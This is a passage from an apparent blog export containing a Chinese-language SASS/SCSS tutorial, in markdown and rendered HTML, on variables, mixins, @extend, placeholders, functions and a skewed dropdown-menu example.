%typography;\n}\n\n.menu li:hover {\n  background: $sfbgColor;\n}\n\n.menu > li > a {\n  padding: 1em 2em;\n  @include skewX(-25deg);\n}\n\n/*Dropdown menu*/\n.drop-menu {\n  position: absolute;\n  width: $width / 4;\n  left: 50%;\n  margin-left: -($width / 8);\n  opacity: 0;\n  visibility: hidden;\n  @include skewX(-25deg);\n  @include transform-origin(left top);\n  li {\n    background-color: $bgColor;\n    position: relative;\n    overflow: hidden;\n    opacity: 0;\n    visibility: hidden;\n    @include transition(all .2s ease );\n    a {\n      padding: 1em 2em;\n    }\n    &::after {\n      content: \"\";\n      position: absolute;\n      top: -125%;\n      height: 100%;\n      width: 100%;\n      @include box-shadow(0 0 50px rgba(0,0,0,.9));\n    }\n    &:nth-child(odd) {\n      @include transform(skewX(-25deg) translateX(0));\n      a {\n        @include skewX(25deg);\n      }\n      &::after {\n        right: -50%;\n        @include transform(skewX(-25deg) rotate(3deg));\n      }\n    }\n    &:nth-child(even){\n      @include transform(skewX(25deg) translateX(0));\n      a {\n        @include skewX(-25deg);\n      }\n      &::after {\n        left: -50%;\n        @include transform(skewX(25deg) rotate(3deg));\n      }\n    }\n  }\n}\n\n.menu > li:hover .drop-menu,\n.menu > li:hover .drop-menu li {\n  opacity: 1;\n  visibility: visible;\n}\n\n.menu > li:hover .drop-menu li:nth-child(even){\n  @include transform(skewX(25deg) translateX(15px));\n}\n\n.menu > li:hover .drop-menu li:nth-child(odd){\n  @include transform(skewX(-25deg) translateX(-15px));\n}\n```\n\n\n\n## 阅读\n\n- [Sass中文网](https://www.sass.hk/)\n- [SASS基础教程——SASS基本语法与特性](https://www.w3cplus.com/preprocessor/sass-basic-syntax-and-features.html)\n- [sass揭秘之变量](https://www.w3cplus.com/preprocessor/sass-basic-variable.html)\n- [理解SASS的嵌套，@extend，%Placeholders和Mixins](https://www.w3cplus.com/preprocessor/sass-basic-mixins-nesting-placeholders-extend.html)\n- 在线编辑SCSS工具：[sassmeister](https://www.sassmeister.com/)\n- [sass揭秘之@if，@for，@each（转载）](https://www.cnblogs.com/dingyufenglian/p/4864392.html)\n\n\n\n\n\n\n\n","source":"_posts/SCSS.md","raw":"---\ntitle: SASS\ncategories:\n  - CSS\ntags:\n  - SCSS\nabbrlink: ea50967e\ndate: 2020-03-24 08:19:20\n---\n\n# SASS\n\n## 什么是SASS\n\n​\tSASS 是一种基于 CSS 的预处理语言，他在CSS的语法的基础上增加了变量(variables)\\嵌套(nested rules)、混合(mixins)、导入(inline import)等高级功能，这样在开发项目是便于管理整体项目的样式风格。\n\n### SASS的特征\n\n- 完全兼容 CSS3\n- 在 CSS 基础上增加变量、嵌套 (nesting)、混合 (mixins) 等功能\n- 通过函数进行颜色值与属性值的运算\n- 提供控制指令等高级功能\n- 自定义输出格式\n\n### SASS的语法格式\n\nSASS分为两种语法，一种是SCSS，另一种就是SASS。\n\nSCSS是最新的语法：\n\n+ 扩展名为.scss\n+ SCSS语法规则和CSS的语法规则基本一样，使用大括号{}和分号;来分隔块的样式\n+ 增强了对CSS3语法的支持\n\nSASS是老语法：\n\n+ 扩展名为.sass\n+ SASS语法也称之为SASS的缩进语法，使用缩进和换行来分块，而不是使用分号来分隔语句，和stylus这种预处理语言类似\n\n**现在只学习scss语法**\n\n##SCSS语法\n\n### 变量（Variables）\n\n```scss\n$color: #333;  // 声明变量\n$bgcolor:#f36;\nbody {\n  color: $color; // 引用变量\n  background-color: $bgcolor;\n}\n```\n\n#### 变量默认值!default\n\n```scss\n$color:red;\n$color:blue !default;\np{\n    color:$color; //red\n}\n// 假设变量申明带有!default，如果在此申明之前没有这个变量的申明，则用这个值，\n// 反之如果之前有申明，则用申明的值。\n// 当然如果你先!default申明，然后再申明一次，那就没什么意思了，这就是基本的变量覆盖，第一次申明的有无!default都一样。\n```\n\n\n\n#### 变量用`#{}`包裹\n\n```scss\n$btnClass: btn !default;\n$borderDirection:  top !default;\n\n.#{$btnClass}{\n    border-#{$borderDirection}:1px solid #ccc;\n}\n\n// 解析成的css：\n.btn{\n    border-top:1px solid #ccc;\n}\n```\n\n#### 多个变量一起申明\n\n把多个相关的值写在一个变量里，然后通过`nth($var,index)`来获取第几个值。\n\n```scss\n$linkColor: red blue !default;\na{\n    color:nth($linkColor,1);\n    &:hover{\n        color:nth($linkColor,2);\n    }\n}\n\n// 解析成的css：\na {\n    color: red; \n}\na:hover {\n    color: blue; \n}\n```\n\n\n\n### 嵌套(Nesting)\n\nSASS中的嵌套有两种，一种是选择器的嵌套，另外一种是样式的嵌套。\n\n然而这两种嵌套的目的都是一样的，减少代码量，增强代码的可读性。\n\n#### 选择器的嵌套\n\n```scss\n$color: #333; \n$bgcolor:#f36;\n\nsection {\n  margin: 10px;\n  background-color: #f36;\n  nav {\n    color: $color;\n    height: 25px;\n    a {\n      color: #0982c1;\n      &:hover{\n        text-decoration: underline;\n      }\n    }\n  }\n}\n```\n\n\n\n#### 样式的嵌套\n\n```scss\nli { \n  font: { \n    style:italic; \n    family:serif; \n    weight:bold; \n    size:1.2em; \n  } \n} \n// 当然font属性可以使用css3的合写，那就更简单了\nli { \n  font: serif italic bold 1.2em;\n} \n```\n\n\n\n### Mixins\n\nMixins是SASS中最强大的特性之一，简单点来说，Mixins可以将一部分样式抽出，作为单独定义的模块，被很多选择器重复使用。\n\n```scss\n@mixin error($borderWidth: 2px){\n  border: $borderWidth solid #f00;\n  color: #f00;\n}\n\nspan {\n  @include error(10px)\n}\n```\n\n举例：\n\n```scss\n//Example: @include prefixer(border-radius, $radius, webkit spec);\n//----------------------------------------\n$prefix-for-webkit: true !default;\n$prefix-for-mozilla: true !default;\n$prefix-for-microsoft: true !default;\n$prefix-for-opera: true !default;\n$prefix-for-spec: true !default; // required for keyframe mixin\n//prefixer\n@mixin prefixer ($property, $value, $prefixes) {\n  @each $prefix in $prefixes {\n    @if $prefix == webkit and $prefix-for-webkit == true {\n      -webkit-#{$property}: $value !important;\n    }\n    @else if $prefix == moz and $prefix-for-mozilla == true {\n      -moz-#{$property}: $value;\n    }\n    @else if $prefix == ms and $prefix-for-microsoft == true {\n      -ms-#{$property}: $value;\n    }\n    @else if $prefix == o and $prefix-for-opera == true {\n      -o-#{$property}: $value;\n    }\n    @else if $prefix == spec and $prefix-for-spec == true {      #{$property}: $value;\n    }\n    @else {\n      @warn \"Unrecognized prefix: #{$prefix}\";\n    }\n  }\n}\n\n@mixin skewX($degrees) {\n  @include prefixer(transform, skewX($degrees), webkit moz o ms spec);\n  -webkit-backface-visibility: hidden;\n}\np {\n  @include skewX(45deg)\n}\n```\n\n编译后：\n\n```css\np {\n  -webkit-transform: skewX(45deg) !important;\n  -moz-transform: skewX(45deg);\n  -o-transform: skewX(45deg);\n  -ms-transform: skewX(45deg);\n  transform: skewX(45deg);\n  -webkit-backface-visibility: hidden;\n}\n```\n\n### @extend\n\n假设现在要设计一个普通错误样式与一个严重错误样式，一般会这样写：\n\n```html\n<style>\n.error {\n  border: 1px #f00;\n  background-color: #fdd;\n}\n.seriousError {\n  border-width: 3px;\n}\n</style>\n<div class=\"error seriousError\">\n  Oh no! You've been hacked!\n</div>\n\n```\n\n使用`@extend`：\n\n```scss\n.error {\n  border: 1px #f00;\n  background-color: #fdd;\n}\n.seriousError {\n  @extend .error;\n  border-width: 3px;\n}\n```\n\n**注意@extendh会有一个缺点：**\n\n```scss\n.error {\n  border: 1px #f00;\n  background-color: #fdd;\n}\n// 这是一个其他样式\np .error {\n  color: blue;\n}\n.seriousError {\n  @extend .error;\n  border-width: 3px;\n}\n```\n\n但是在编译后的CSS：\n\n```css\n.error, .seriousError {\n  border: 1px #f00;\n  background-color: #fdd;\n}\n\np .error, p .seriousError {\n  color: blue;\n}\n\n.seriousError {\n  border-width: 3px;\n}\n\n// 然而你只想实现\n.error, .seriousError {\n  border: 1px #f00;\n  background-color: #fdd;\n}\n\np .error { // 这部分的样式不能干扰到 seriousError\n  color: blue;\n}\n\n.seriousError {\n  border-width: 3px;\n}\n```\n\n所以，通过`@extend`引用的类名，你要有绝对的自信，它从未用在几个地方。\n\n### 嵌套、Mixins和@extend的缺点\n\n嵌套：有可能编译的css层级过深\n\nMixins：Mixins用来指定具体属性值会使css变得臃肿\n\n**Mixins的黄金规则**是将相似的风格定义在一个`@mixin`中。请注意这里的一个关键词**相似的**，另外Mixins主要是用于重用，而不是用来指定具体的属性值。\n\n@extend：`@extend`是可以读取SASS文件中类名，这样就会出现意想不到的问题，如上的`.error`\n\n\n\n### 强大的%placeholders\n\n使用`%`和`@extend`就可以将继承中埋下的地雷给排了。\n\n`%`只是一个占位符，他不是正常的选择器，不像`.classes`或者`#ids`，只要不通过`@extend`调用，他是不会产生任何代码量。\n\n首先使用`%placeholders`定义一个公用样式，类似于`.class`：\n\n```scss\n%placeholders {\n  color: red;\n}\n```\n\n在需要使用的地方通过`@extend`来调用：\n\n```scss\nselector {\n  @extend %placeholders;\n}\n```\n\n举例：\n\n```scss\n@mixin fit-content() {\n    width: -webkit-fit-content;\n    width: -moz-fit-content;\n    width: -o-fit-content;\n    width: -ms-fit-content;\n    width: fit-content;\n}\n\n%clearfix {\n    *zoom: 1;\n    &:after,\n    &:before {\n      content: \"\";\n      display: table;\n    }\n    &:after {\n      clear: both;\n      overflow: hidden;\n    }\n}\n\nnav {\n    display: block;\n    ul {\n        margin: 50px auto;\n        width: 800px;\n        @include fit-content();\n        padding: 0;\n        list-style: none;\n        @extend %clearfix;\n    }\n}\n```\n\n\n\n### @function\n\n@function与@mixin，%这两者的第一点不同在于sass本身就有一些内置的函数，方便我们调用，如强大的color函数；其次就是它返回的是一个值，而不是一段css样式代码什么的。\n\n```scss\n$f00: #f00;\n\n//作为变量值\n$redDark: darken($f00,10%) !default;\n\n//作为属性值\np{\n    color: darken($f00,70%);\n    background-color: $redDark;\n}\n```\n\n#### rgba\n\n分为两种：`rgba($red, $green, $blue, $alpha)`和`rgba($color, $alpha)`。\n\n第一种跟css3一样，不介绍，第二种对我们有点用，实例：\n\n```scss\nrgba(#102030, 0.5) => rgba(16, 32, 48, 0.5)\nrgba(blue, 0.2)    => rgba(0, 0, 255, 0.2)\n```\n\n#### ie-hex-str\n\nie-hex-str($color)\n\n这个函数将一个颜色格式化成ie滤镜使用，在做css3使用滤镜兼容的时候用得上，实例：\n\n```scss\nie-hex-str(#abc) => #FFAABBCC\nie-hex-str(#3322BB) => #FF3322BB\nie-hex-str(rgba(0, 255, 0, 0.5)) => #8000FF00\n```\n\n#### darken\n\ndarken(color,color,amount)\n\n第一个参数是颜色，第二参数是百分数介于0%-100%，表示将某个颜色变暗多少个百分比。\n\n```scss\ndarken(hsl(25, 100%, 80%), 30%) => hsl(25, 100%, 50%)\ndarken(#800, 20%) => #200\n```\n\n#### lighten\n\nlighten(color,color,amount)\n\n第一个参数是颜色，第二参数是百分数介于0%-100%，表示将某个颜色变亮多少个百分比。\n\n```scss\nlighten(hsl(0, 0%, 0%), 30%) => hsl(0, 0, 30)\nlighten(#800, 20%) => #e00\n```\n\n#### percentage\n\npercentage($value)： 将一个没有单位的数字转成百分比形式\n\n```scss\npercentage(0.2) => 20%\npercentage(100px / 50px) => 200%\n```\n\n#### length\n\nlength($list)\n\n返回一个列表的长度\n\n```scss\nlength(10px) => 1\nlength(#514721 #FFF6BF #FFD324) => 3\n```\n\n#### nth\n\nnth(list,list,n);\n\n返回列表里面第n个位置的值\n\n```scss\nnth(10px 20px 30px, 1) => 10px\nnth((Helvetica, Arial, sans-serif), 3) => sans-serif\n```\n\n#### unit\n\nunit($number)\n\n得到这个数的单位\n\n```scss\nunit(100) => \"\"\nunit(100px) => \"px\"\nunit(3em) => \"em\"\nunit(10px * 5em) => \"em*px\"\nunit(10px * 5em / 30cm / 1rem) => \"em*px/cm*rem\"\n```\n\n#### unitless\n\nunitless($number)\n\n返回这个数是否没有单位\n\n```scss\nunitless(100) => true\nunitless(100px) => false\n```\n\n#### 三目判断\n\nif(condition,condition,if-true, $if-false)\n\n第一个表示条件，第二个表示条件为真的值，第三个表示为假的值\n\n```scss\nif(true, 1px, 2px) => 1px\nif(false, 1px, 2px) => 2px\n```\n\n注意函数是返回一个值，不能直接放到sass里面直接去运行的，会报错。\n\n你可以把这些用在判断或者属性值里面，那么就是一级棒。\n\n下面我们来搞点自己定义的函数吧，先来个简单的：\n\n```scss\n// px转em\n@function pxToEm($px, $base: 16) {\n  @return ($px / $base) * 1em;\n}\n// 调用下：\np{\n  font-size:pxToEm(20);\n}\n// 解析后的css：\np {\n  font-size: 1.25em;\n}\n```\n\n### @if和@else\n\n```scss\n$filter:false !default; //是否开启ie滤镜\n//背景色半透明\n@mixin bgcolor-alpha($bgcolor: rgba(0,0,0,.5)){\n  color:#fff;\n  @if $filter{\n  filter:progid:DXImageTransform.Microsoft.gradient(enabled='true',startColorstr='#{ie-hex-str($bgcolor)}', endColorstr='#{ie-hex-str($bgcolor)}');\n  }@else{\n    background-color: #333;\n  }\n  background-color:$bgcolor;\n}\n```\n\n这是半透明rgba背景的一段代码，高级浏览器用rgba，ie6-8如果开启滤镜用滤镜，不开启滤镜就用纯色，常用于图片下方浮现标题。\n\n当然也不可能总是判断一个变量的真假那么简单，没有或与非的情况吧。sass的@if用`not,or,and`分别表示非，或，与。\n\n```scss\n$a:   false !default;\n$b:   true !default;\n\n@if not($a){\n  p{\n    color:red;\n  }\n}\n\ndiv{\n  font-size:14px;\n  @if $a or $b{\n    width:300px;\n  }\n}\n\nli{\n  line-height:24px;   \n  @if $a and $b{\n    float:left;\n  }\n}\n```\n\n想想还是漏了个，sass用`==,!=`分别表示等于与不等于。\n\n```scss\n$radius: 5px !default;\n\n.box-border{\n  border:1px solid #ccc;\n  padding:10px;\n\n  @if $radius != 0{\n    border-radius:$radius; \n  }\n}  \n\n$sizeClass: small !default;\n\n.size{\n  @if $sizeClass == 'small'{\n    padding:5px;\n  }@else{\n    padding:10px;\n  }\n}\n```\n\n### @for\n\nfor循环有两种形式，分别为：``@for $var from start through end` 和`@for $var start from to  end` 。$i表示变量，start表示起始值，end表示结束值，这两个的区别是关键字through表示包括end这个数，而to则不包括end这个数。先来个简单的：\n\n```scss\n@for $i from 1 through 3 {\n  .item-#{$i} { width: 2em * $i; }\n}\n```\n\n### @each\n\n语法：@each $var in\n\n```scss\n@each $animal in puma, sea-slug, egret, salamander {\n  .#{$animal}-icon {\n    background-image: url('/images/#{$animal}.png');\n  }\n}\n```\n\n```scss\n$sprite: puma sea-slug egret salamander !default;\n\n%sprite-animal{\n    background: url('/images/animal.png') no-repeat;\n}\n@each $animal in $sprite {\n    .#{$animal}-icon {\n        @extend %sprite-animal;     \n        background-position:0 -(index($sprite,$animal)*30px);\n    }\n}\n```\n\n使用scss设计按钮样式：\n\n```scss\n//$btnColorClass: (primary #0078E7 #fff) (green $green #fff);\n$btnColorClass: (primary #0078E7 #fff) (blue #00A3CF #fff) (orange #F47837 #fff) !default;\n\n@mixin btn-color($bgColor:#e6e6e6, $textColor:#333){\n  color:$textColor;\n  background-color: $bgColor;\n  border:1px solid darken($bgColor, 5%);\n  border-color:lighten($bgColor, 2%) darken($bgColor, 5%) darken($bgColor, 5%) lighten($bgColor, 2%);\n\n  &:hover{\n    background-color: darken($bgColor,5%);\n    color:$textColor;\n  }\n}\n\n@each $colorClass in $btnColorClass{\n  $class:      nth($colorClass,1);\n  $bgColor:    nth($colorClass,2);\n  $textColor:  nth($colorClass,3);\n  .btn-#{$class}{\n    @include btn-color($bgColor,$textColor);\n  }\n}\n```\n\n\n\n\n\n## @include vs @extend\n\n避免代码重复生成，\n\nSASS中产生了Mixins，我们可以将相似的样式定义成一个函数模块，然后通过`@include`来调用。但很多时候，我们又不需要这么强大的功能。\n\n这个时候出现`@extend`来调用定义好相同样式的类，可没想到，这个功能是方便了，但无形中为使用者埋下了一个地雷。\n\n为了解除这个隐患，在SASS3.2中增加了一个`%placeholders`功能。让大家能很方便定义一些功能简单的相同样式模块。\n\n通过前面的介绍`@mixin`需要`@include`来调用，而`.class`和`%placeholders`需要`@extend`来调用，那么两者有何区别呢？\n\n- `@include`主要是用来调用`@mixin`定义的函数模块。在`@mixin`中可以定义一个相似功能样式，而且可以设置变量、定义参数和默认参数值；\n- `@extend`主要是用来调用`.class`或者`%placeholders`定义的属性模块；在`.class`或者`%placeholders`中可以定义一个相同样式，但这里面不能定义参数；\n- `@include`每次调用相同的`@mixin`时，编译出来的CSS相同样式不会进行合并；\n- `@extend`每次调用相同的 `.class`时，如果`.class`在样式出现多次，那么编译出来的CSS有可能不是需要的样式；\n- `@extend`每次调用相同的`%placeholders`时，编译出来的CSS相同样式会进行合并。\n\n下面我们通过一个清除浮动的案例，分别看看`@include`和`@extend`之间的区别：\n\n### `@include`与`@mixin`使用例子\n\n```scss\n@mixin clearfix{\n    & {\n      *zoom: 1;\n    }\n    &:before,\n    &:after {\n      display: table;\n      content: \"\";\n    }\n    &:after {\n      clear: both;\n      overflow: hidden;\n    }\n}\n\nul{\n  @include clearfix;\n}\n.block {\n  @include clearfix;\n}\n```\n\n编译后：\n\n```css\nul {\n  *zoom: 1;\n}\nul:before, ul:after {\n  display: table;\n  content: \"\";\n}\nul:after {\n  clear: both;\n  overflow: hidden;\n}\n\n.block {\n  *zoom: 1;\n}\n.block:before, .block:after {\n  display: table;\n  content: \"\";\n}\n.block:after {\n  clear: both;\n  overflow: hidden;\n}\n```\n\n很明显，相同的样式不会进行合并。\n\n### `@include`和`%placeholders`使用例子\n\n```scss\n%clearfix{\n    & {\n      *zoom: 1;\n    }\n    &:before,\n    &:after {\n        display: table;\n        content: \"\";\n    }\n    &:after {\n        clear: both;\n        overflow: hidden;\n    }\n}\n\nul{\n  @extend %clearfix;\n}\n.block {\n  @extend %clearfix;\n}\n```\n\n编译后：\n\n```css\n.block, ul {\n  *zoom: 1;\n}\n.block:before, ul:before, .block:after, ul:after {\n  display: table;\n  content: \"\";\n}\n.block:after, ul:after {\n  clear: both;\n  overflow: hidden;\n}\n```\n\n很明显相同样式代码已经进行合并。\n\n### Mixins与%placeholders的结合\n\nMixins如果使用不当，就会产生很多重复的代码，但仅用`@extend`很多时候又无法达到功能上的需求。\n\n那么有没有方法能把Mixins与`%placeholders`结合起来，取他们各自的优势呢？\n\n大家都知道,`%placeholders`就类似于CSS中的`.classes`或者`#ids`，只不过使用`%`代替了`.`和`#`。但`%placeholders`中的代码只有通过 `@extend`调用之后才会产生代码量，不然他是不会产生任何代码量。\n\n下面我们来看一个Mixins与`%placeholders`结合在一起制作的一个网格系统。\n\n```scss\n%grid {\n  box-sizing: border-box;\n  display: inline-block;\n  padding-left: 1em;\n  padding-right: 1em;\n}\n\n@mixin grid($width: 1){\n  @extend %grid;\n  width: percentage($width);\n}\n\n.grid-half {\n  @include grid(1 / 2);\n}\n\n.grid-third {\n  @include grid(1 / 3);\n}\n```\n\n按照这样的方法，我们可以制作出一个简单的百分比网格系统：\n\n```scss\n$columns: 12;\n$gutter: 2em;\n\n%grid {\n  box-sizing: border-box;\n  display: inline-block;\n  padding: {\n    left:$gutter / 2;\n    right:$gutter / 2;\n  }   \n}\n\n@mixin grid($width: 1){\n  @extend %grid;\n  width: percentage($width);\n}\n\n@for $column from 1 through $columns {\n  .grid-#{$column} {\n    @include grid(1 / $column);\n  }\n}\n```\n\n\n\n## 使用Mixins和继承的细节\n\n了解了`@include`定义的`@mixin`,`@extend`定义的`.class`和`@extend`定义的`%placeholders`差异之后，我们在写SASS时，有一些细节大家应该了解：\n\n- 不要使用没有设置参数的`@mixin`，他们应该是`.class`或者`%placeholders`;\n- 不要轻意（从不使用）`@extend`调用`.class`。会得到你意想不到的结果，特别是定义的`.class`出现在嵌套或其他的样式表中，你应该使用`@extend`调用`%placeholders`;\n- 不要使用太深的选择器嵌套。\n- 如果你能避免，不要使用标签名。这不是一个taxative规则，但比id或者类名的性能要更低；\n- 不要使用子选择器符号`>`，在SASS中很无效；\n- 不要使用同史选择器`+`，配合你当前的标记他是非常无效。\n- 不要太相信SASS的自动编译，你应该时时检查生成的CSS。在SASS中纠错能力比较差；\n\n## 案例实战\n\n![案例实战](SCSS/%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98.gif)\n\n1.`html`结构\n\n```html\n<ul class=\"menu\">\n  <li><a href=\"\">首页</a></li>\n  <li>\n    <a href=\"\">博客</a>\n    <ul class=\"drop-menu\">\n      <li><a href=\"\">CSS3</a></li>\n      <li><a href=\"\">SASS</a></li>\n      <li><a href=\"\">JavaScript</a></li>\n      <li><a href=\"\">jQuery</a></li>\n    </ul>\n  </li>\n  <li><a href=\"\">案例</a></li>\n  <li><a href=\"\">资源</a></li>\n  <li><a href=\"\">前端收藏夹</a></li>\n</ul>\n```\n\n有了结构，我们就要开始动手了，在动手之前对这个效果先简单的分析一下：\n\n- **定义变量**：我要定义几个变量，方便换成别的风格；\n- **清除浮动**：列表使用了浮动，需要清除浮动\n- **清除列表默认样式**：导航是使用ul制作，所以需要清除其默认样式\n- **定义transfrom**：效果中使用到了CSS3的transform，使用`@mixin`定义成一个模块\n- **定义transition**：下拉菜单出现的时候有一个transition效果\n- **定义fit-content**：使用CSS3的fit-content\n- **定义box-shadow**：使用CSS3的box-shadow\n- **定义文本**：设置菜单项文本效果\n\n1. 定义变量\n\n```scss\n//1.定义变量\n$color: #fff !default; //设置文本颜色\n$bgColor: #34495e !default;//设置背景色\n$sfbgColor: #e74c3c !default;//设置悬浮背景色\n$fontSize: 14px !default;//设置字号\n$fontFamily: Arial, Helvetica !default;//设置字体\n$width: 462px !default; //设置默认宽度\n```\n\n2. 清除浮动\n\n```scss\n//2.使用%placeholders定义清除浮动\n%clearfix {\n  &{\n    *zoom: 1;\n  }\n  &:before,\n  &:after{\n    content: \"\";\n    display: table;\n  }\n  &:after {\n    clear: both;\n    overflow: hidden;\n  }\n```\n\n3. 清除列表默认样式\n\n```scss\n//3.清除列表默认样式\n%listStyle {\n  margin: 0;\n  padding: 0;    list-style: none outside none;\n}\n\n$prefix-for-webkit: true !default;\n$prefix-for-mozilla: true !default;\n$prefix-for-microsoft: true !default;\n$prefix-for-opera: true !default;\n$prefix-for-spec: true !default; \n```\n\n4. 定义transfrom\n\n```scss\n// 4.浏览器前缀\n@mixin prefixer ($property, $value, $prefixes) {\n  @each $prefix in $prefixes {\n    @if $prefix == webkit and $prefix-for-webkit == true {\n      -webkit-#{$property}: $value;\n    } @else if $prefix == moz and $prefix-for-mozilla == true {\n      -moz-#{$property}: $value;\n    } @else if $prefix == ms and $prefix-for-microsoft == true {\n      -ms-#{$property}: $value;\n    } @else if $prefix == o and $prefix-for-opera == true {\n      -o-#{$property}: $value;\n    } @else if $prefix == spec and $prefix-for-spec == true {\n      #{$property}: $value;\n    } @else {\n      @warn \"Unrecognized prefix: #{$prefix}\";\n    }\n  }\n}\n```\n\n5. 定义transition\n\n```scss\n//5.定义transform\n//示例: @include prefixer(border-radius, $radius, webkit spec);\n//Transform, transform-origin, transform-style\n//----------------------------------------\n@mixin transform($property...) {\n  @include prefixer(transform, $property, webkit moz o ms spec);\n}\n\n@mixin transform-origin($axes: 50%) {\n  // x-axis - left | center | right  | length | %\n  // y-axis - top  | center | bottom | length | %\n  // z-axis - length\n  @include prefixer(transform-origin, $axes, webkit moz o ms spec);\n}\n\n@mixin skewX($degrees) {\n  @include prefixer(transform, skewX($degrees), webkit moz o ms spec);\n  -webkit-backface-visibility: hidden;\n}\n\n```\n\n6. 定义fit-content\n\n```scss\n//6.定义transition\n// Return vendor-prefixed property names if appropriate\n// Example: transition-property-names((transform, color, background), moz) -> -moz-transform, color, background//----------------------------------------\n@function transition-property-names($props, $vendor: false) {\n  $new-props: ();\n  @each $prop in $props {\n    $new-props: append($new-props, transition-property-name($prop, $vendor), comma);\n  }\n  @return $new-props;\n}\n@function transition-property-name($prop, $vendor: false) {\n  // put other properties that need to be prefixed here aswell\n  @if $vendor and $prop == transform {\n    @return unquote('-'+$vendor+'-'+$prop);\n  }\n  @else {\n    @return $prop;\n  }\n}\n// transition\n//----------------------------------------\n@mixin transition ($properties...) {\n  @if length($properties) >= 1 {\n    @include prefixer(transition, $properties, webkit moz o ms spec);\n  } @else {\n    $properties: all 0.15s ease-out 0;\n    @include prefixer(transition, $properties, webkit moz o ms spec);\n  }\n}\n\n```\n\n7. 定义fit-content\n\n```scss\n//7.定义fit-content\n@mixin fit-content {\n  width: -webkit-fit-content;\n  width: -moz-fit-content;\n  width: -o-fit-content;\n  width: -ms-fit-content;\n  width: fit-content;\n}\n\n```\n\n8. 定义box-shadow\n\n```scss\n//8.设置box-shadow\n// box-shadow\n@mixin box-shadow($shadow...) {\n  @include prefixer(box-shadow, $shadow, webkit spec);\n}\n```\n\n9. 定义文本\n\n```scss\n//9.设置文本\n%typography {\n  color: $color;\n  text: {\n    decoration: none;\n    align: center;\n  }   \n  font: {\n    family: $fontFamily;\n    size: $fontSize;\n  }\n}\n```\n\n10. 具体样式\n\n```scss\n// 10.具体样式\n.menu {\n  width: $width;\n  @extend %clearfix;//调用清除浮动\n  @extend %listStyle;//调用清除列表样式\n  @include fit-content;\n  margin: 50px auto;\n}\n\n.drop-menu {\n  @extend %listStyle;//调用清除列表样式\n}\n\n.menu > li {\n  background: $bgColor;\n  float: left;\n  position: relative;    @include skewX(25deg);\n}\n\n.menu a {\n  display: block;\n  @extend %typography;\n}\n\n.menu li:hover {\n  background: $sfbgColor;\n}\n\n.menu > li > a {\n  padding: 1em 2em;\n  @include skewX(-25deg);\n}\n\n/*Dropdown menu*/\n.drop-menu {\n  position: absolute;\n  width: $width / 4;\n  left: 50%;\n  margin-left: -($width / 8);\n  opacity: 0;\n  visibility: hidden;\n  @include skewX(-25deg);\n  @include transform-origin(left top);\n  li {\n    background-color: $bgColor;\n    position: relative;\n    overflow: hidden;\n    opacity: 0;\n    visibility: hidden;\n    @include transition(all .2s ease );\n    a {\n      padding: 1em 2em;\n    }\n    &::after {\n      content: \"\";\n      position: absolute;\n      top: -125%;\n      height: 100%;\n      width: 100%;\n      @include box-shadow(0 0 50px rgba(0,0,0,.9));\n    }\n    &:nth-child(odd) {\n      @include transform(skewX(-25deg) translateX(0));\n      a {\n        @include skewX(25deg);\n      }\n      &::after {\n        right: -50%;\n        @include transform(skewX(-25deg) rotate(3deg));\n      }\n    }\n    &:nth-child(even){\n      @include transform(skewX(25deg) translateX(0));\n      a {\n        @include skewX(-25deg);\n      }\n      &::after {\n        left: -50%;\n        @include transform(skewX(25deg) rotate(3deg));\n      }\n    }\n  }\n}\n\n.menu > li:hover .drop-menu,\n.menu > li:hover .drop-menu li {\n  opacity: 1;\n  visibility: visible;\n}\n\n.menu > li:hover .drop-menu li:nth-child(even){\n  @include transform(skewX(25deg) translateX(15px));\n}\n\n.menu > li:hover .drop-menu li:nth-child(odd){\n  @include transform(skewX(-25deg) translateX(-15px));\n}\n```\n\n\n\n## 阅读\n\n- [Sass中文网](https://www.sass.hk/)\n- [SASS基础教程——SASS基本语法与特性](https://www.w3cplus.com/preprocessor/sass-basic-syntax-and-features.html)\n- [sass揭秘之变量](https://www.w3cplus.com/preprocessor/sass-basic-variable.html)\n- [理解SASS的嵌套，@extend，%Placeholders和Mixins](https://www.w3cplus.com/preprocessor/sass-basic-mixins-nesting-placeholders-extend.html)\n- 在线编辑SCSS工具：[sassmeister](https://www.sassmeister.com/)\n- [sass揭秘之@if，@for，@each（转载）](https://www.cnblogs.com/dingyufenglian/p/4864392.html)\n\n\n\n\n\n\n\n","slug":"SCSS","published":1,"updated":"2020-06-22T10:04:59.243Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckclr4u2d0001qrwt23zvu2rx","content":"<h1 id=\"SASS\"><a href=\"#SASS\" class=\"headerlink\" title=\"SASS\"></a>SASS</h1><h2 id=\"什么是SASS\"><a href=\"#什么是SASS\" class=\"headerlink\" title=\"什么是SASS\"></a>什么是SASS</h2><p>​    SASS 是一种基于 CSS 的预处理语言，他在CSS的语法的基础上增加了变量(variables)\\嵌套(nested rules)、混合(mixins)、导入(inline import)等高级功能，这样在开发项目是便于管理整体项目的样式风格。</p>\n<h3 id=\"SASS的特征\"><a href=\"#SASS的特征\" class=\"headerlink\" title=\"SASS的特征\"></a>SASS的特征</h3><ul>\n<li>完全兼容 CSS3</li>\n<li>在 CSS 基础上增加变量、嵌套 (nesting)、混合 (mixins) 等功能</li>\n<li>通过函数进行颜色值与属性值的运算</li>\n<li>提供控制指令等高级功能</li>\n<li>自定义输出格式</li>\n</ul>\n<h3 id=\"SASS的语法格式\"><a href=\"#SASS的语法格式\" class=\"headerlink\" title=\"SASS的语法格式\"></a>SASS的语法格式</h3><p>SASS分为两种语法，一种是SCSS，另一种就是SASS。</p>\n<p>SCSS是最新的语法：</p>\n<ul>\n<li>扩展名为.scss</li>\n<li>SCSS语法规则和CSS的语法规则基本一样，使用大括号{}和分号;来分隔块的样式</li>\n<li>增强了对CSS3语法的支持</li>\n</ul>\n<p>SASS是老语法：</p>\n<ul>\n<li>扩展名为.sass</li>\n<li>SASS语法也称之为SASS的缩进语法，使用缩进和换行来分块，而不是使用分号来分隔语句，和stylus这种预处理语言类似</li>\n</ul>\n<p><strong>现在只学习scss语法</strong></p>\n<p>##SCSS语法</p>\n<h3 id=\"变量（Variables）\"><a href=\"#变量（Variables）\" class=\"headerlink\" title=\"变量（Variables）\"></a>变量（Variables）</h3><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$color</span>: <span 